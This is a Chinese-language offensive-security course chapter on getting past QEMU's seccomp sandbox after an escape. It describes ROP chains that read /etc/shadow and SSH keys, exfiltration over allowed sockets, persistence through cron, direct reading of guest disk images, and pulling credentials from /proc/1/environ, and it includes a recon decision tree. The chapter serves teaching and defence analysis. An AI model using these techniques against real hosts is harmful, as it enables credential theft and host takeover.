# Ch 37 — 逃逸後還被關著：繞過 QEMU seccomp sandbox

> **目標**：理解在 `execve` 被封的條件下，如何用 QEMU 允許的 syscall 集合達到「實際有用的 impact」——資料外洩、持久化、或為 host kernel LPE 鋪路。

> **環境**：理論分析 + 部分程式碼骨架（未實測，需要啟用 `-sandbox on` 的 QEMU build 驗證）

## 為什麼需要這個？

Ch 36 說了 seccomp 封住 `execve`。這章要回答下一個問題：那又如何？

「拿不到 shell」和「什麼都做不了」完全不同。`security/binary_exploitation` 學過的 **orw（open-read-write）** 技術——在 seccomp 封 `execve` 的條件下，用 `open`/`read`/`write` 讀出 `/etc/shadow`、`/root/.ssh/id_rsa` 或 host 的 secret——在這裡直接適用，只是舞台從一般 CTF 題搬到了 QEMU 行程。

更進一步：QEMU 因為需要網路 backend、VNC、SPICE、磁碟 I/O，本來就允許相當多的 syscall。這個白名單本身就是攻擊者的工具集。

## 先建立直覺

想像你打進了一棟大樓的保全室，但門被鎖上，你沒辦法直接跑出去。但保全室裡有電話（網路 syscall）、有文件櫃（file I/O）、有對講機（IPC）、有監控螢幕（`/proc`）。你用不到「跑出去」這個動作，但你能做的事已經相當多。

seccomp 白名單的結構是：
```
允許 → QEMU 運作必要的一切
封鎖 → 讓攻擊者能直接提權或 spawn process 的那些
```

但「QEMU 運作必要的一切」本來就很多。我們的任務是把這個集合當作工具箱。

## 底層機制：允許的 syscall 能做什麼

### QEMU seccomp 允許集合（概略分類）

以 QEMU 7.x 搭配 `-sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny` 為例（未實測，對照 `system/qemu-seccomp.c`）：

```
檔案 I/O：
  open, openat, creat, read, readv, pread64
  write, writev, pwrite64
  close, lseek, dup, dup2, dup3
  stat, fstat, lstat, statx, newfstatat
  rename, renameeat, link, unlink, unlinkat
  mkdir, rmdir, getdents64

記憶體：
  mmap, munmap, mprotect, mremap, madvise
  brk, mincore, msync

網路（若 backend 需要）：
  socket, bind, connect, listen, accept, accept4
  send, sendmsg, sendto, recv, recvmsg, recvfrom
  setsockopt, getsockopt, getsockname, getpeername
  poll, select, epoll_create, epoll_ctl, epoll_wait

多執行緒：
  futex, nanosleep, clock_nanosleep
  getpid, gettid, tgkill

KVM 操作：
  ioctl（/dev/kvm 相關）

訊號：
  sigaction, sigprocmask, signalfd, signalfd4
  rt_sigaction, rt_sigprocmask

被封的重要項目：
  execve ← spawn=deny
  execveat ← spawn=deny
  fork ← spawn=deny（部分版本）
  clone ← spawn=deny（部分版本）
  setuid, setgid, setcap ← elevateprivileges=deny
  setrlimit ← resourcecontrol=deny
```

### 「必要但危險」的 syscall：防禦者的困境

從防禦者角度看，允許清單裡有一批 syscall 是 **QEMU 不能沒有、但攻擊者拿到會很危險** 的。這個矛盾是 seccomp 不能解決、只能緩解的根本問題。

| QEMU 需要它做什麼 | syscall | 攻擊者能拿來做什麼 |
|---|---|---|
| 磁碟 I/O 讀寫 guest 磁碟映像 | `pread64` / `pwrite64` | 直接讀寫 `.qcow2` 內容、篡改 guest 磁碟結構 |
| 映射 guest RAM、device emulation 的記憶體 | `mmap` / `mprotect` | 讓 ROP chain 更容易——`mprotect` 可以把已知位址設 RWX；`mmap` 可以分配可控記憶體 |
| VNC/SPICE/telnet monitor backend | `socket` / `connect` / `send` | 主動把讀到的機密資料外傳到攻擊者伺服器 |
| tap 網路、SLIRP backend | `bind` / `recvfrom` | 在 host 上建立監聽 port，做為 reverse shell 的替代品（雖然不是真正 shell，但能雙向傳資料） |
| live migration、共享記憶體 | `userfaultfd`（舊版）| 在 kernel exploit 中用來暫停 kernel page fault，讓 race condition 更穩定 |
| qcow2 cluster 查詢、VirtIO 批次 | `getdents64` + `readlinkat` | 枚舉 `/proc/self/fd`，找出 QEMU 行程持有的全部 fd 及其指向 |
| KVM 虛擬化核心操作 | `ioctl` | 呼叫 host kernel 的 KVM ioctl，若有 kernel bug 則直接觸發 LPE |

這張表的核心訊息：**每一行的左欄都是 QEMU 的合法需求，右欄都是攻擊者的武器**。防禦者要在不破壞 QEMU 功能的前提下限縮右欄，而這個空間相當有限。

### 策略一：orw 資料外洩

最直接的方法。ROP chain 不跑 `execve`，改用：

```
open("/etc/shadow", O_RDONLY, 0)
read(fd, buf, 4096)
write(1, buf, n)   ← 寫到 QEMU 的 stdout，透過 virtio-serial 或 telnet 讀到
```

或者透過網路外洩：
```
socket(AF_INET, SOCK_STREAM, 0)
connect(fd, &attacker_addr, sizeof(...))
open("/root/.ssh/id_rsa", O_RDONLY, 0)
read(file_fd, buf, ...)
send(sock_fd, buf, n, 0)
```

這需要：(1) 網路 syscall 沒被封、(2) QEMU 行程能 `connect` 到外部（網路 namespace 沒隔離）。

**與 CTF seccomp 逃逸的對應**：這就是 `security/binary_exploitation` 學的 orw ROP，只是 gadget 來自 QEMU binary 而非 CTF binary。QEMU 是幾十 MB 的 C 程式，gadget 充足。（未實測，理論預期）

#### orw ROP chain 的骨架

CTF 課程講了 orw 概念，這裡把骨架在 QEMU 脈絡下具體化。一個以 `openat` + `read` + `write` 為核心的 ROP chain，在 x86-64 的 gadget 序列長這樣（概念示意，未實測）：

```
─── openat(AT_FDCWD, pathname_ptr, O_RDONLY, 0) ───────────────
[pop rdi; ret]          ← 設 arg1 = AT_FDCWD (-100)
[pop rsi; ret]          ← 設 arg2 = &pathname（指向我們在記憶體裡放的字串）
[pop rdx; ret]          ← 設 arg3 = O_RDONLY (0)
[pop r10; ret]          ← 設 arg4 = 0（mode，openat 不用）
[pop rax; ret]          ← syscall number = 257（openat）
[syscall; ret]          ← 呼叫，rax 回傳 fd（例如 fd=7）

─── read(fd, buf_ptr, count) ──────────────────────────────────
[pop rdi; ret]          ← 設 arg1 = 7（openat 回傳的 fd）
[pop rsi; ret]          ← 設 arg2 = &buf（我們有寫入權的記憶體位址）
[pop rdx; ret]          ← 設 arg3 = 4096
[pop rax; ret]          ← syscall number = 0（read）
[syscall; ret]          ← 呼叫，rax 回傳實際讀取位元組數

─── write(1, buf_ptr, n) 或 send(sock_fd, buf_ptr, n, 0) ──────
[pop rdi; ret]          ← 設 arg1 = 1（stdout）或 socket fd
[pop rsi; ret]          ← 設 arg2 = &buf
[pop rdx; ret]          ← 設 arg3 = n（read 的回傳值，但 ROP 裡通常直接填 4096）
[pop rax; ret]          ← syscall number = 1（write）或 44（sendto）
[syscall; ret]          ← 外洩完成
```

這個序列的前提是：(1) 找到 `pop rdi/rsi/rdx/rax; ret` 這類 gadget、(2) 有辦法在記憶體裡放 pathname 字串（通常是把它嵌在 ROP payload 的末尾，或是用已知的可寫段）、(3) 有一塊已知位址的可寫記憶體當 buf。

QEMU binary 本身有幾十 MB 的 `.text` 段，加上動態連結的 glibc、libpixman、libglib 等，**gadget 來源遠比 CTF 的 200KB 小 binary 豐富**。用 `ROPgadget --binary /usr/bin/qemu-system-x86_64` 或 `ropper -f /usr/bin/qemu-system-x86_64` 能找到數萬個 gadget。（未實測，理論預期）

pathname 字串的存放方式有兩種實際路線：
- **嵌在 payload 尾部**：ROP payload 本身就包含字串，透過已知的洩漏位址計算其位址
- **寫到 BSS/資料段**：先用 `write` syscall 把字串寫到 QEMU 的 `.bss` 裡某個已知的可寫位址，再讓後面的 gadget 引用

### 策略二：利用允許的 syscall 寫 host 檔案

若目標不是讀機密而是持久化，可以：
- 用 `open`/`write` 在 `qemu` 使用者能寫的路徑植入檔案
- 尋找 QEMU 有寫入權限的 cron 路徑、systemd service 目錄等

但這受 DAC 限制（Ch 36 層 3）：只有 `qemu` 使用者能寫的路徑有效。在 sVirt 開啟的環境，還受 SELinux 標籤限制。

### 策略三：找 QEMU 行程本身有的 fd

QEMU 行程開著很多 fd：
- `/dev/kvm`
- tap 網路裝置
- 磁碟映像（VM 的 `.qcow2`/`.raw` 檔）
- monitor socket
- SPICE/VNC socket

取得 code exec 後可以枚舉 `/proc/self/fd/`（需要 `getdents`/`readlinkat`，通常允許）：

```c
// 偽碼，未實測
int dfd = open("/proc/self/fd", O_RDONLY | O_DIRECTORY, 0);
// getdents64 列出 fd
// readlinkat 看每個 fd 指向什麼
```

若找到磁碟映像的 fd，可以直接用 `pread64`/`pwrite64` 讀寫 guest 的磁碟——在雲端場景這意味著可以篡改另一個 VM 的磁碟（取決於 sVirt 是否開啟）。

### 策略四：攻擊 QEMU monitor 或 QMP socket

libvirt 替 QEMU 建一個 monitor socket（通常是 Unix domain socket），允許透過 QMP 協定控制 VM。若 QEMU 行程本身持有這個 socket 的 fd，逃逸後可以透過這個 socket 向 libvirt daemon 發送指令——例如 `{ "execute": "human-monitor-command", "arguments": { "command-line": "savevm" } }`。

這個攻擊面取決於 socket 的存取控制（libvirt 通常需要 libvirt daemon 認證），但值得在 fd 枚舉後檢查。

### 策略五：seccomp filter 邊界案例

某些 QEMU 版本或 distro patch 的 seccomp filter 本身可能有漏洞：

- **`ioctl` 的過度允許**：若 `ioctl` 沒有加 argument filter（BPF filter 可以過濾 ioctl 的 `request` 參數，但不是所有版本都做），攻擊者可能透過 `/dev/kvm` ioctl 做超出預期的事。
- **`ptrace` 洞**：若某版 QEMU 的 seccomp 允許 `ptrace`（因為某個 debug 功能），攻擊者可以 ptrace 自己的行程去修改 memory，繞過一些限制。（通常不會允許，但要查）
- **`memfd_create` + `execveat`**：若 `memfd_create` 允許但 `execveat` 只封了特定 flag，可能有繞過——但現代 `spawn=deny` 通常把 `execveat` 完整封住。

### 策略六：為 host kernel LPE 鋪路

最高價值的情境：逃逸後在 `qemu` 使用者身份下，用允許的 syscall 觸發 host kernel 漏洞，拿到 root。

- QEMU 行程有 `/dev/kvm` 的 fd，可以呼叫 KVM ioctl
- 若 host kernel KVM 驅動有 bug，從 QEMU 行程觸發比從 guest 觸發更近（因為不用穿越 VMX non-root 邊界）
- 同理，host kernel 的其他 `ioctl` 介面（`/dev/snd`、`/dev/input` 等）若 QEMU 有開著的 fd，都可以嘗試

這條路的終點是 host root，接 Ch 40 的完整 chain。

## 取得 code exec 後的偵察流程

拿到 QEMU 行程的 code execution 之後，在跑 orw 或網路外洩之前，應該先做一輪偵察，確認實際的環境狀態。偵察本身只需要 `open`/`read`/`getdents64`/`readlinkat` 這些 QEMU 一定允許的 syscall，不受 seccomp 干擾。

**步驟 1：確認身份與 capability**

讀 `/proc/self/status`，找 `Uid`、`Gid`、`CapEff` 欄位。
- `Uid: 107 107 107 107`（數字對應 `/etc/passwd` 裡的 qemu 使用者）：確認 QEMU 沒有以 root 跑。
- `CapEff: 0000000000000000`：確認沒有任何 effective capability，提權路徑只剩 kernel exploit。
- 若 `CapEff` 有非零位元（例如 `CAP_NET_ADMIN` = bit 12），代表這個 QEMU 跑在某種特殊配置下，值得深入研究。

**步驟 2：確認 MAC 層狀態**

讀 `/proc/self/attr/current`：
- 若內容是 `system_u:system_r:svirt_t:s0:c123,c456` 格式，表示 SELinux 啟用且 sVirt 有效；orw 讀 root-owned 系統檔案的路徑幾乎被封死，要轉向 fd 枚舉和網路外洩。
- 若內容是 `unconfined`，SELinux 未限制這個行程，orw 只受 DAC 約束。
- 若讀到的是 AppArmor 格式（路徑樣式，如 `/usr/bin/qemu-system-x86_64 (enforce)`），查對應 profile 確認允許哪些路徑。

**步驟 3：枚舉 fd**

讀 `/proc/self/fd/`（用 `getdents64` 列出，再對每個 fd 號用 `readlinkat` 看 symlink 目標）。建立一份 fd → target 的對照表：
- `/dev/kvm` → 策略六（host kernel LPE）的起點
- `/path/to/vm-disk.qcow2` 或 `.raw` → 策略三的磁碟讀寫
- `socket:[...]`（Unix domain socket）→ 可能是 QMP monitor，策略四的目標
- `/dev/net/tun` → tap 裝置，代表有網路 backend

**步驟 4：確認網路外洩路徑**

讀 `/proc/net/route`，看 QEMU 行程的路由表：
- 若有 default route（`Destination: 00000000`），代表 `connect()` 可以出去，網路外洩可行。
- 若只有 `192.168.122.x`（libvirt 預設的 virbr0），代表 QEMU 在私有 bridge 網路，需要連接到 host 的 virbr0 IP（通常是 `192.168.122.1`）做中繼，再從 host 轉發到外部。

這四個步驟在 ROP chain 裡全部能做，每一步都是 `open` → `read` → 分析 → 決策下一步。偵察的結果決定後續採用哪個策略。

## 與 binary_exploitation 課的 seccomp 逃逸對比

同樣叫「orw bypass seccomp」，CTF 課和 QEMU 逃逸場景有三個關鍵差異：

**1. 白名單嚴格程度相反**

CTF 的 seccomp 題通常把白名單壓到極限——最嚴格的只留 `open`（或 `openat`）、`read`、`write`、`exit` 四個 syscall，連 `mprotect`、`brk` 都封掉，強迫你在非常受限的 gadget 環境下操作。QEMU 的 seccomp 設計動機完全相反：它要讓 QEMU **正常運作**，所以允許的 syscall 遠遠更多。對攻擊者來說，QEMU seccomp 是「比 CTF 題寬鬆得多的限制」。

**2. Gadget 來源的規模差距**

CTF 的 binary 通常幾十 KB 到幾百 KB，gadget 稀少，找到合適的 pop 序列需要技巧（甚至需要 `ret2csu`、`ret2dlresolve` 等進階技術）。`/usr/bin/qemu-system-x86_64` 在典型安裝下接近 10-30 MB，加上它 `dlopen` 的 backend plugins 和動態連結的大型 C library，可用 gadget 的數量是 CTF binary 的幾十倍。`mprotect(addr, size, PROT_READ|PROT_WRITE|PROT_EXEC)` 需要的三個 pop gadget，在 QEMU binary 裡幾乎不可能找不到。（未實測，理論預期）

**3. Target 和 impact 的本質不同**

CTF 題的目標通常是讀 `./flag` 或讀 `/flag`——是個演習場景。QEMU 逃逸的目標是 host 上的真實機密：`/etc/shadow`、`~/.ssh/id_rsa`、`/run/secrets/`（Docker/Kubernetes 的 secret 掛載點）、或 `/proc/1/environ` 裡的環境變數（可能包含 AWS_ACCESS_KEY_ID 等 credential）。讀到這些東西的現實價值遠超一個 CTF flag，也因此 orw 在 VM 逃逸場景裡是首選路徑而非備案。

這個對比的實踐意義：如果你在 CTF 課裡學過 orw 但覺得「這也太基礎了」，那你在 QEMU 逃逸裡面對的是同一組技術，只是環境更寬鬆、籌碼更大。

## 對比與取捨

| 策略 | 依賴條件 | 可繞 sVirt | 最終 impact | 適用情境 |
|---|---|---|---|---|
| orw 讀機密檔 | file I/O syscall 允許 | 受限（標籤邊界）| 資訊洩漏 | 獲取憑證/金鑰 |
| 網路外洩 | socket 允許 + 無 netns | 需要（sVirt 不擋網路方向）| 資訊外傳 | 無 netns 隔離時 |
| 寫 host 檔案 | 可寫路徑 + 無 sVirt | 需要 sVirt 無限制該路徑 | 持久化 | qemu 使用者可寫路徑 |
| fd 枚舉 + 磁碟 | getdents/readlinkat 允許 | 受 sVirt 限制 | 跨 VM 資料 | sVirt 未開或有洞 |
| host kernel LPE | 有 KVM fd + kernel bug | 繞過所有層 | host root | 最高價值 full chain |

## 多層防禦組合的現實

實務上，防禦不是單一技術，是 seccomp + sVirt/AppArmor + namespace 三層的組合。這三層各開各關，攻擊者能做的事差距很大：

| seccomp | MAC（sVirt/AppArmor） | namespace 隔離 | 攻擊者能力 | 現實案例 |
|---|---|---|---|---|
| 開 | 開（sVirt） | 開（netns/pidns） | 只剩 fd 枚舉 + 受標籤限制的讀寫；orw 讀 `/etc/shadow` 被 SELinux 擋 | RHEL/CentOS 生產環境，libvirt 預設 |
| 開 | 開（AppArmor） | 開 | AppArmor profile 通常比 SELinux 寬鬆；能讀的路徑取決於 profile，可能包含 `/proc/` 內容 | Ubuntu 生產，`/etc/apparmor.d/abstractions/libvirt-qemu` |
| 開 | 關 | 開 | orw 可以讀 `qemu` 使用者能讀的所有路徑；有 netns 則網路外洩受限 | 開發機、測試環境，部分 baremetal 部署 |
| 開 | 關 | 關（無 netns） | orw + 網路外洩全開；可以 `connect` 到外部 | 最常見的「沒設定好」場景 |
| 關 | 開 | 開 | 無 seccomp = `execve` 可用，直接開 shell；MAC 擋持久化但擋不住 shell | 幾乎不存在（沒有理由關 seccomp 開 MAC） |
| 關 | 關 | 關 | 完整 host 行程能力；差不多等於 root | 純開發環境、部分舊版 nested virt |

**最常見的現實部署**：
- **RHEL 8/9 + libvirt**：seccomp 開 + sVirt（SELinux）開 + 無完整 netns 隔離（bridge 網路）。orw 讀 `/etc/shadow` 被 SELinux 擋，但網路外洩路徑未必被擋（sVirt 主要管檔案標籤，不管 outbound TCP）。
- **Ubuntu 22.04 + libvirt**：seccomp 開 + AppArmor 開（profile 較寬鬆）+ 無 netns。攻擊面比 RHEL 大一點，部分路徑能讀。
- **Kata Containers**：每個容器獨立 microVM，seccomp + MAC + 完整 netns 全開，是防禦最強的組合，攻擊難度最高。

這個矩陣的實踐意義：拿到 code exec 後第一件事不是立刻跑 orw，而是先確認 MAC 層的狀態——用 `cat /proc/self/attr/current` 看 SELinux label（應該是 `system_u:system_r:svirt_t:...`），或讀 `/proc/self/attr/apparmor/current` 看 AppArmor profile。這決定了哪些路徑的 orw 有意義。

## 踩雷集錦

**「seccomp 封了 execve，所以我只能讀資料，什麼嚴重的事都做不了」**
→ 資訊洩漏在雲端場景通常就是最嚴重的事——讀到 host 的 SSH key、AWS credential、KMS key，遠比一個 shell 更有價值。orw 不是降級方案，是實際場景中的首選路徑。
→ 實際確認方法：在拿到 QEMU code exec 後，先讀 `/proc/1/environ`（init 行程的環境變數）和 `/proc/self/environ`，確認有哪些 credential 在記憶體/環境裡——很多雲端部署把 API key 放環境變數。

**「QEMU seccomp 的 filter 是固定的，我只要查 qemu-seccomp.c 就知道全部」**
→ 不同 distro 的包會 patch seccomp filter；libvirt 啟動 QEMU 時傳的 `-sandbox` 參數也可能不同。要看實際跑起來的 filter，用 `seccomp-tools dump -p <PID>` 轉出 BPF bytecode 才準。
→ 實際確認方法：`cat /proc/<PID>/status | grep Seccomp` 確認模式（0=無，1=strict，2=filter），然後用 `seccomp-tools dump -p <PID>` 或 `bpftrace -e 'tracepoint:raw_syscalls:sys_enter { ... }'` 追蹤實際允許的 syscall 集合。

**「clone 被封了所以不能開執行緒，ROP chain 只能單執行緒跑」**
→ 大部分情況下 clone 被封的是某些 flags（如 `CLONE_NEWUSER`），而非完整封鎖——QEMU 自己就是多執行緒的，它初始化時就建了 QEMU main thread + iothread，這些 thread 已存在，不需要再 clone。你在任何一個 thread 的 context 取得 RIP 就能用那個 thread 做事。
→ 實際確認方法：用 `ls /proc/<PID>/task/` 確認 QEMU 行程已有多少執行緒；每個 task 目錄是一個已存在的 thread，各自有 registers state。

**「sVirt 會擋住 orw 讀 host 檔案」**
→ sVirt 擋的是「QEMU 行程存取 SELinux 標籤不匹配的資源」。`/etc/shadow` 在大多數 SELinux policy 下不允許 `svirt_t` 存取——所以 sVirt 確實擋得住這條路。要測試，先用 `sesearch -A -s svirt_t -t shadow_t` 確認 policy 是否允許。
→ 實際確認方法：在目標系統（不是 guest）執行 `sesearch -A -s svirt_t -c file -p read`，列出 `svirt_t` 有 `read` 權限的 file type，逐一評估哪些有攻擊價值。若沒有 `sesearch`，看 `/var/log/audit/audit.log` 的 `AVC denied` 記錄，反過來推測被擋的路徑。

**「只要 QEMU 行程能 socket + connect，seccomp 就完全沒用」**
→ 即使能做網路外洩，你仍然在 `qemu` 使用者的 DAC 邊界內，讀不到 root-only 資源，也不能提權。seccomp 的「沒用」只是在「完全無害」的意義上——它仍然有效地限制了 spawn process 這個最直接的攻擊路徑。
→ 實際確認方法：在 QEMU 行程身份下，`cat /proc/self/status | grep -E 'Uid|Gid|Cap'` 確認實際身份和 capability；若 `CapEff` 是全 0（或只剩 DAC-related），提權路徑就只剩 kernel exploit。

## 進階：再往深一層

**BPF filter 的細粒度 argument 過濾**：libseccomp 可以對 `ioctl` 的 `request` 參數做過濾（用 `seccomp_rule_add_exact` 帶 `SCMP_A1` argument comparator）。若 QEMU 的 seccomp 做了這一層，攻擊者的 `ioctl` 就只能用特定 request number。反之，若沒有 argument 過濾，`ioctl` 對任何 fd 的任何 request 都開放。

**`userfaultfd` 的攻防**：`userfaultfd` syscall 在舊版 QEMU seccomp 中可能被允許（因為 KVM 的某些 live migration 功能用到它），但它也是 kernel exploit 的重要輔助工具（讓 kernel 在 page fault 時暫停等你操作）。現代 QEMU 版本和 distro 通常會封掉它，但要查實際 filter。

**seccomp-unotify（user notification）**：Linux 5.0+ 的 `SECCOMP_RET_USER_NOTIF` 允許把被攔截的 syscall 轉發到另一個行程去決策，而非直接 kill。若 QEMU 的 seccomp filter 使用這個機制（目前不常見），攻擊面就變成「控制那個 handler 行程」。

**`mprotect` 的雙刃劍效應**：QEMU 允許 `mprotect` 是因為它需要動態管理 guest RAM 的記憶體映射（例如 KVM 的 dirty tracking 需要把頁面設為 read-only 再捕捉 write fault）。但 `mprotect` 對攻擊者同樣有用——在取得 arbitrary write 後，若目標記憶體區段是 RW 但不是 X，呼叫 `mprotect(addr, size, PROT_READ|PROT_WRITE|PROT_EXEC)` 就能讓它變可執行，把 shellcode 打進去直接跑，不需要 ROP chain。這個路徑的前提是有 arbitrary write + 知道 writable 記憶體的位址；在 QEMU 漏洞利用中，有 OOB write 的情境下這是首選，比組 ROP chain 省力。（未實測，理論預期）

**多個 seccomp filter 的繼承問題**：若 libvirt 在 fork 出 QEMU 之前就安裝了一個寬鬆的 seccomp filter，QEMU 再安裝第二個更嚴格的 filter，Linux 的 seccomp 規則是「多個 filter 取 AND（都要通過）」——也就是說較嚴格的那個永遠有效。但反過來，若 QEMU 的 `-sandbox on` 實作是在初始化後期才安裝 filter，那麼在 filter 安裝前這個 window 期間（行程啟動到 filter 設置這段時間）呼叫的 syscall 不受限制。這個 race 在實際 pwn 場景通常沒有太大意義（你的漏洞觸發點是在 QEMU 正常運行時），但在稽核 QEMU 行程啟動序列時值得確認 filter 是在哪個初始化點安裝的。

**`pread64` 直接讀磁碟映像的技術細節**：QEMU 行程持有 guest 磁碟映像（`.qcow2` 或 `.raw`）的 fd。若 sVirt 未開、或者同一個 QEMU 行程管理的磁碟，fd 枚舉後可以用 `pread64(disk_fd, buf, size, offset)` 直接讀取任意 offset 的磁碟內容，完全繞過 guest OS 的檔案系統層。

對 `.raw` 格式：offset 直接對應磁碟 LBA，用 `lseek` + `read` 即可。對 `.qcow2` 格式：需要解析 qcow2 header 才能把 guest 的 cluster 位址轉成實際的 file offset——但這可以靜態分析 qcow2 格式後純用 `pread64` 實作，不需要任何額外 syscall。若目標是特定 guest 的 `/etc/shadow`（在 ext4 分區上），步驟是：解析 MBR/GPT 找分區偏移 → 解析 ext4 superblock 找 inode table → 查 `/etc/shadow` 的 inode → 讀 inode 的 block 指標 → `pread64` 讀出對應 block。這整個過程只用 `pread64`，不需要 `mount`，不需要 `execve`。（未實測，理論預期；`qcow2` 格式解析需要額外 userspace 程式碼）

**pid fd 枚舉 + `/proc/self/maps` 分析**：取得 code exec 後，`/proc/self/maps` 列出 QEMU 行程的完整記憶體布局——每一行是一個 VMA，包含起始位址、權限、偏移、和對應的 backing 檔案名稱。這份資料有兩個用途：

第一，確認 ASLR 的情況。`/proc/self/maps` 裡 `[heap]` 的起始位址、各共享庫的載入位址，讓我們知道 ASLR 已隨機化到哪個程度——但由於 QEMU 是 PIE binary，所有位址在每次啟動都不同。如果攻擊者有 arbitrary read，讀 `maps` 是最快速的 ASLR bypass 方式。

第二，確認 gadget 來源。`/proc/self/maps` 裡可以看到 QEMU 載入了哪些 `.so`——`libglib-2.0.so`、`libpixman-1.so`、`libslirp.so`、`libz.so` 等。每一個 `.so` 都是額外的 gadget 來源，有些 `.so`（特別是 glibc）有大量 `syscall; ret` 和各種 pop 序列。把 `maps` 的輸出傳回攻擊端後，可以針對這個 QEMU 實例的 **精確** 載入位址，用 ROPgadget 預先算好 gadget offset，現場組裝 payload。

## 動手練習

1. **查 QEMU 實際 filter**：啟動一個帶 `-sandbox on` 的 QEMU（需要有 seccomp 支援的 build），用 `seccomp-tools dump -p $(pgrep qemu)` 轉出 BPF bytecode 並解讀。找出哪些 syscall 號被允許。（未實測，需 `seccomp-tools` 安裝）

2. **模擬 orw ROP**：寫一個 C 程式，先安裝一個封住 `execve` 但允許 `open`/`read`/`write`/`socket`/`connect`/`send` 的 seccomp filter，然後（透過 inline assembly）模擬 ROP 呼叫這些 syscall 讀出 `/etc/hostname` 並送到 `127.0.0.1:4444`。這驗證了 orw 在 seccomp 限制下的可行性。

3. **fd 枚舉練習**：在一個帶 `-sandbox on` 的 QEMU 行程上，用 `ls -la /proc/<PID>/fd/` 從外面枚舉 fd，找出 QEMU 開著什麼 fd，評估哪些 fd 的 target 有攻擊價值。

4. **讀 `/proc/self/maps` 分析 gadget 來源**：對一個執行中的 QEMU 行程執行 `cat /proc/<PID>/maps`，列出所有載入的 library，用 ROPgadget 對其中一個 `.so` 找出 `pop rdi; ret`、`pop rsi; ret`、`pop rdx; ret`、`syscall; ret` 四個 gadget 的 offset。驗證 QEMU 環境的 gadget 豐富程度。（需要在 Linux host 上執行；QEMU binary 路徑因 distro 而異）

5. **偵察流程模擬**：寫一個小 C 程式，先安裝一個只允許 `open`/`read`/`getdents64`/`readlinkat`/`write`/`exit` 的 seccomp filter（模擬 QEMU 逃逸後的偵察階段），然後依序讀 `/proc/self/status`、`/proc/self/attr/current`、`/proc/self/fd/`（用 getdents64）、`/proc/net/route`，把結果用 `write(1, ...)` 輸出。確認這些偵察操作在嚴格 seccomp 下都能順利執行。

## 從偵察到 payload 的決策樹

綜合本章所有策略，拿到 code exec 後的決策順序如下：

```
取得 code exec（Ch 34-36 的漏洞觸發）
    │
    ▼
偵察：讀 /proc/self/status, /proc/self/attr/current, /proc/self/fd/, /proc/net/route
    │
    ├─ CapEff 非零？
    │      └─ 是 → 研究具體 capability，可能有直接提權路徑
    │
    ├─ MAC 狀態？
    │      ├─ sVirt (svirt_t) → orw 讀 /etc/shadow 等被擋，改走 fd 枚舉 + 網路外洩
    │      ├─ AppArmor → 查 profile，確認可讀路徑
    │      └─ unconfined → orw 路徑全開（受 DAC 限制）
    │
    ├─ fd 枚舉找到 /dev/kvm？
    │      └─ 是 → 評估 host kernel KVM 漏洞，走策略六（LPE）
    │
    ├─ fd 枚舉找到磁碟映像 fd？
    │      └─ 是 → pread64 讀磁碟，走策略三（跨 VM 資料 / guest 檔案系統）
    │
    ├─ 網路路由可外連？
    │      └─ 是 → socket + connect + send，走策略一（網路外洩）
    │
    └─ 只有本地可寫路徑？
           └─ open + write 植入 cron/systemd，走策略二（持久化）
```

這棵樹不是非此即彼：同一次攻擊可以同時走多條路——偵察完後先用 orw 讀 `/proc/1/environ` 抓 credential（快速得分），再評估是否有 KVM LPE 的機會（高風險高收益）。

## 本章重點整理

- `execve` 被封只是讓「直接開 shell」不可能，大量攻擊路徑仍然存在
- orw（open-read-write）是 seccomp 限制下最直接的攻擊路徑，讀機密檔案外洩
- QEMU seccomp 白名單比 CTF 題寬鬆得多：它需要 I/O、網路、KVM 操作，全部都允許
- orw ROP chain 在 QEMU 的核心骨架是 openat → read → write/send，gadget 從幾十 MB 的 QEMU binary + 動態庫找，比 CTF 題容易得多
- 網路 syscall 允許時可以做主動外傳；QEMU 開著的 fd 是另一個攻擊面
- 真實 QEMU seccomp filter 因版本/distro 而異，要用 `seccomp-tools` 轉出 BPF 才準
- 三層防禦（seccomp + MAC + namespace）的組合決定攻擊者實際能做什麼；seccomp 單獨開不足夠
- sVirt + seccomp 組合才是真正的 depth defense；單獨繞任何一層都不夠
- `pread64` 可以繞過 guest OS 直讀磁碟映像；`/proc/self/maps` 是 ASLR bypass 和 gadget 定位的起點
- full chain 的下一步通常是利用 host kernel 漏洞從 `qemu` 使用者拿 root

## 自我檢核

- [ ] 能說出三種在 `execve` 被封的條件下仍然有用的攻擊策略
- [ ] 理解 orw ROP chain 的結構（openat → read → write 三個 syscall 的 argument 和 gadget 序列）
- [ ] 能說明 QEMU seccomp 白名單為何比 CTF 題的 seccomp 對攻擊者更友善
- [ ] 能解釋為何 fd 枚舉在 QEMU 逃逸場景特別有價值，以及 `pread64` 如何讀磁碟映像
- [ ] 知道如何用工具轉出執行中的 seccomp filter 並分析
- [ ] 能說明 seccomp 與 sVirt 如何組合形成 defense-in-depth
- [ ] 能用三層防禦矩陣（seccomp/MAC/namespace）判斷特定部署場景下攻擊者的實際能力範圍

## 延伸閱讀

1. **CTFwiki「Seccomp 繞過」**（ctf-wiki.org 或繁體 CTF 教材）
   - orw 技術的標準介紹：在 seccomp 封 execve 的條件下讀機密檔案。學什麼：ROP chain 結構 + 哪些 syscall 組合能達到有效 impact。

2. **`seccomp-tools` GitHub**（`github.com/david942j/seccomp-tools`）
   - 轉出、解析、模擬 seccomp BPF filter 的工具。學什麼：實際分析 QEMU 行程的 seccomp 限制。關聯 Ch 36 的 filter 研究。

3. **「A Beginner's Guide to seccomp in Linux」（blog.lizzie.io）**
   - seccomp BPF filter 機制與 argument filtering 的詳細說明。學什麼：理解為何 `ioctl` 的過度允許會造成問題。

4. **Pwn2Own 2019 VirtualBox Escape（fluoroacetate + amat1）writeup**
   - 真實商業 hypervisor 逃逸後繞 sandbox 的案例；展示「拿到 host code exec 但還有後續障礙」的完整思路。學什麼：full chain 的實際複雜度。

5. **「Escaping the Sandbox: Chrome Sandbox Bypass Techniques」（trail of bits blog 或類似）**
   - browser_pwn 的 sandbox bypass 思路與 QEMU seccomp bypass 有概念上的相似性（都是在 syscall 白名單限制下操作）。學什麼：sandbox bypass 的通用思維框架。

6. **qcow2 disk format specification**（`qemu.org/docs/master/interop/qcow2.html`）
   - 理解 qcow2 cluster 結構，是實作「從 fd 直讀磁碟映像」技術的前置知識。學什麼：cluster 位址到 file offset 的轉換，以及 L1/L2 table 的解析方式。

---

→ [Ch 38 — 雲端 microVM：Firecracker、gVisor 攻擊面](./38-cloud-microvm.md)
